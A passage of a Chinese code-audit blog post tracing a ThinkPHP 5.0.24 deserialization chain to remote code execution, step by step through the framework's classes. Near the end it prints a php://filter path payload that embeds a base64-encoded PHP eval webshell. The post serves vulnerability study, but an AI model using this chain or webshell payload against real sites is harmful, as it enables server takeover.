+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    $relation   <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getAttr</span>($key);
+</span></span><span style="display:flex;"><span>                    $item[$key] <span style="color:#f92672">=</span> $relation<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">append</span>([$attr])<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">toArray</span>();
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                    $relation <span style="color:#f92672">=</span> <span style="color:#a6e22e">Loader</span><span style="color:#f92672">::</span><span style="color:#a6e22e">parseName</span>($name, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">method_exists</span>($this, $relation)) {
+</span></span><span style="display:flex;"><span>                        $modelRelation <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span>$relation();
+</span></span><span style="display:flex;"><span>                        $value         <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getRelationData</span>($modelRelation);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">method_exists</span>($modelRelation, <span style="color:#e6db74">&#39;getBindAttr&#39;</span>)) {
+</span></span><span style="display:flex;"><span>                            $bindAttr <span style="color:#f92672">=</span> $modelRelation<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getBindAttr</span>();
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">if</span> ($bindAttr) {
+</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">foreach</span> ($bindAttr <span style="color:#66d9ef">as</span> $key <span style="color:#f92672">=&gt;</span> $attr) {
+</span></span><span style="display:flex;"><span>                                    $key <span style="color:#f92672">=</span> <span style="color:#a6e22e">is_numeric</span>($key) <span style="color:#f92672">?</span> $attr <span style="color:#f92672">:</span> $key;
+</span></span><span style="display:flex;"><span>                                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span>[$key])) {
+</span></span><span style="display:flex;"><span>                                        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;bind attr has exists:&#39;</span> <span style="color:#f92672">.</span> $key);
+</span></span><span style="display:flex;"><span>                                    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                                        $item[$key] <span style="color:#f92672">=</span> $value <span style="color:#f92672">?</span> $value<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getAttr</span>($attr) <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>                                    }
+</span></span><span style="display:flex;"><span>                                }
+</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>                            }
+</span></span><span style="display:flex;"><span>                        }
+</span></span><span style="display:flex;"><span>                        $item[$name] <span style="color:#f92672">=</span> $value;
+</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                        $item[$name] <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getAttr</span>($name);
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($item) <span style="color:#f92672">?</span> $item <span style="color:#f92672">:</span> [];
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>进入到<code>toarray</code>方法后，应该考虑如何调用漏洞触发点Output.php中的<code>__call</code>方法</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806150543198.png" alt="image-20230806150543198"></p>
+<p>选择触发这里，怎么才能触发这里</p>
+<pre tabindex="0"><code>if (!empty($this-&gt;append))	
+</code></pre><p><code>$this-&gt;append</code>我们使其非空即可</p>
+<pre tabindex="0"><code>if (is_array($name))
+</code></pre><p><code>$name</code>由<code>$this-&gt;append</code>控制，使其不是数组即可</p>
+<pre tabindex="0"><code>elseif (strpos($name, ‘.’))	
+</code></pre><p>使其不包含<code>.</code>即可</p>
+<pre tabindex="0"><code>if (method_exists($this, $relation))
+</code></pre><p>这个要为true,<code>$relation</code>来自<code>$name</code>,这里的<code>parseName</code>函数可以等价看成<code>$relation</code>=<code>$name</code></p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806151303294.png" alt="image-20230806151303294"></p>
+<p>那么只要<code>$relation</code>为一个类存在的方法即可，可以选择Model类的<code>getError</code>函数,其函数简单，返回的值可控</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806151621178.png" alt="image-20230806151621178"></p>
+<p>所以这里<code>$relation='getError'</code></p>
+<p>继续往下走，跟进<code>getRelationData</code>函数</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806151925267.png" alt="image-20230806151925267"></p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806152018619.png" alt="image-20230806152018619"></p>
+<p>回顾一下，我们的目的是要调用<code>Output.php</code>中的<code>__call</code>方法,那么我们就得使<code>$value</code>为<code>new output</code></p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806152904078.png" alt="image-20230806152904078"></p>
+<p>回到<code>getRelationData</code></p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806153117556.png" alt="image-20230806153117556"></p>
+<p>我们要这个函数返回值使<code>new output</code>，<code>$this-&gt;parent</code>是可控的，但是要怎么进入这个if条件</p>
+<p>首先<code>$this-&gt;parent</code>不能为空，这个很容易满足</p>
+<p>第二个是<code>!$modelRelation-&gt;isSelfRelation()</code>，得让其返回值不为空：</p>
+<p><code>$modelRelation</code>我们可控，所以得找一个包含有这个方法的类并且返回值不为空</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806153815399.png" alt="image-20230806153815399"></p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806153832701.png" alt="image-20230806153832701"></p>
+<p>找到Relation类有这个方法，但是Relation类是个抽象类，要找继承其的类，等等再找，现在先分析if条件。</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806153905272.png" alt="image-20230806153905272"></p>
+<p>第三个是</p>
+<p><code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</code></p>
+<p>前面我们已经确定<code>$this-&gt;parent</code>要为<code>output</code>类，所以<code>get_class($modelRelation-&gt;getModel())</code>也要为output类，其次我们控制的<code>$modelRelation</code>也要有<code>getModel</code>方法</p>
+<p>另外回到入口点，往下看看，发现<code>$modelRelation</code>还需要有<code>getBindAttr()</code></p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806154633500.png" alt="image-20230806154633500"></p>
+<p>总结一下<code>$modelRelation</code>要继承 <code>Relation</code>类，还要有<code>getModel</code>方法和<code>getBindAttr()</code></p>
+<p>那现在找一下</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806154744715.png" alt="image-20230806154744715"></p>
+<p>符合要求的有<code>onetoone</code>这个类,所以我们就让<code>$modelRelation</code>为这个类，但是<code>onetoone</code>还是个抽象类,还得看谁继承了<code>onetoone</code>这个类</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806155053796.png" alt="image-20230806155053796"></p>
+<p>可以选择<code>HasOne</code>这个类,即<code>$modelRelation=new hasone()</code></p>
+<p>再回来看<code>getRelationData</code>函数</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806155334526.png" alt="image-20230806155334526"></p>
+<p>我们需要令<code>!$modelRelation-&gt;isSelfRelation()</code>即<code>!$HasOne-&gt;isSelfRelation()</code>为false</p>
+<p>再看<code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent))</code></p>
+<p>跟进看看<code>hasone-&gt;getModel()</code>,这里的$this-&gt;query我们可控</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806155652092.png" alt="image-20230806155652092"></p>
+<p>全局搜索一下getModel()，发现query类的getmodel好用</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806155806057.png" alt="image-20230806155806057"></p>
+<p>我们只需让<code>$this-&gt;query=new query</code>,并且<code>query</code>类的<code>$this-&gt;model</code>为<code>new output</code>即可</p>
+<p>那么<code>$modelRelation-&gt;getModel()</code>返回值与<code>$this-&gt;parent</code>的返回值相同，都为<code>output</code>对象，所以为真。</p>
+<p>再回到<code>model.php</code></p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806160200128.png" alt="image-20230806160200128"></p>
+<p><code>Hasone</code>类存在<code>getBindAttr</code>方法所以进入if</p>
+<p>然后进入了<code>getBindAttr()</code>函数</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806160429323.png" alt="image-20230806160429323"></p>
+<p><code>$this-&gt;bindAttr</code>是可控的</p>
+<p>继续跟进</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806160514714.png" alt="image-20230806160514714"></p>
+<p>这里要求<code>$bindAttr</code>为一个非空的数组，再往下走</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806160742852.png" alt="image-20230806160742852"></p>
+<p>我们是要进入else这里的，所以这里的<code>data</code>我们将其设置为空</p>
+<p>进入了漏洞触发的地方，这里的<code>$attr</code>是我们可控的点，我们这里设置<code>$value=new output</code>是因为<code>output</code>类没有<code>getAttr</code>方法，所以可以触发<code>output</code>类的<code>call</code>方法</p>
+<p>跟进到<code>output</code>类的<code>call</code>方法</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806161335405.png" alt="image-20230806161335405"></p>
+<p>我们要进入的是<code>call_user_func_array([$this, 'block'], $args)</code></p>
+<p>这个漏洞触发点</p>
+<p>而<code>$method</code>为“getAttr”,<code>$this-&gt;styles</code>是可控的，我们可以令其为<code>[&quot;getAttr&quot;]</code>即可进入if</p>
+<p>接着往下走，跟进<code>block</code>函数</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806161806384.png" alt="image-20230806161806384"></p>
+<p>再往下走，跟进<code>writeln</code>函数</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806161910931.png" alt="image-20230806161910931"></p>
+<p>这里<code>write</code>函数的第二个参数为<code>true</code>,跟进</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806162009952.png" alt="image-20230806162009952"></p>
+<p>这里的<code>handle</code>是可控的,这里的<code>$newline=true</code></p>
+<p>这里我们可以再找一个类当作跳板</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806162345192.png" alt="image-20230806162345192"></p>
+<p>我们可以使用<code>Memcached</code>类的<code>write</code>方法,所以令<code>$this-&gt;handler=new Memcached()</code></p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806162558748.png" alt="image-20230806162558748"></p>
+<p>这里的<code>handler</code>依然可控因为<code>think\cache\driver\File</code>中的<code>set()</code> 方法可以写文件，所以我们这里的<code>$this-&gt;handler=new file()</code></p>
+<p>这样就调用了<code>file</code>类的<code>set</code>方法,注意这里的<code>$sessData</code>传参过来为<code>true</code></p>
+<p>跟进<code>set</code>方法</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806180729658.png" alt="image-20230806180729658"></p>
+<p>因为传参进来的<code>$value=true</code>，所以我们不能直接利用$data写shell</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806180910040.png" alt="image-20230806180910040"></p>
+<p>我们往下走可以看到<code>setTagItem</code>方法,参数是文件名<code>$filename</code>，跟进去</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806181057983.png" alt="image-20230806181057983"></p>
+<p>发现<code>setTagItem</code>方法里面调用了<code>set</code>函数,这里传进来的文件名<code>$filename</code>到<code>set</code>函数就变成了文件内容，那么我们就可以写shell</p>
+<p>而<code>$filename</code>为<code>getCacheKey</code>产生的</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806181415022.png" alt="image-20230806181415022"></p>
+<p>跟进去</p>
+<p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806181445573.png" alt="image-20230806181445573"></p>
+<p>这里的<code>$this-&gt;options['cache_subdir']</code>，<code>$this-&gt;options['prefix']</code>我们可控。所以总的来说即首先给<code>$name</code>进行了MD5，然后给其添加了一个前缀<code>$this-&gt;options['path']</code></p>
+<p><code>$name</code>为md5,不可控，而<code>$this-&gt;options['path']</code>可控，所以利用</p>
+<p><code>$this-&gt;options['path']</code>写shell</p>
+<p>后面就是常见的死亡绕过</p>
+<pre tabindex="0"><code>$this-&gt;options[&#39;path&#39;]=&#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#39;
+</code></pre><p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806195741968.png" alt="image-20230806195741968"></p>
+<p>参考：</p>
+<p><a href="https://blog.csdn.net/weixin_43263451/article/details/123784364">Thinkphp 5.0.24反序列化漏洞导致RCE分析_thinkphp 5.0.24 rce_浔阳江头夜送客丶的博客-CSDN博客</a></p>
+<h1 id="thinkphp51x">thinkphp5.1.x</h1>
+<p>占坑</p>
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/thinkphp/">thinkphp</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+
+                  </div>
+                
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-initial/" data-tooltip="春秋云境 Initial" aria-label="上一篇: 春秋云境 Initial">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/gkjzjh146.github.io\/post\/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9\/';
+        
+          this.page.identifier = '\/post\/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = 'hugo-tranquilpeak-theme';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2023 gkjzjh146. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-initial/" data-tooltip="春秋云境 Initial" aria-label="上一篇: 春秋云境 Initial">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+<div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-times"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2Fthinkphp%25E5%25A4%25A7%25E6%259D%2582%25E7%2583%25A9%2F" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>分享到 Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2Fthinkphp%25E5%25A4%25A7%25E6%259D%2582%25E7%2583%25A9%2F" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2Fthinkphp%25E5%25A4%25A7%25E6%259D%2582%25E7%2583%25A9%2F" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i><span>分享到 Linkedin</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+    
+    <h4 id="about-card-name">gkjzjh146</h4>
+    
+      <div id="about-card-bio">会点web，会点misc</div>
+    
+    
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://gkjzjh146.github.io/images/3.jpeg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://gkjzjh146.github.io/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+
+
+    
+  </body>
+</html>
+
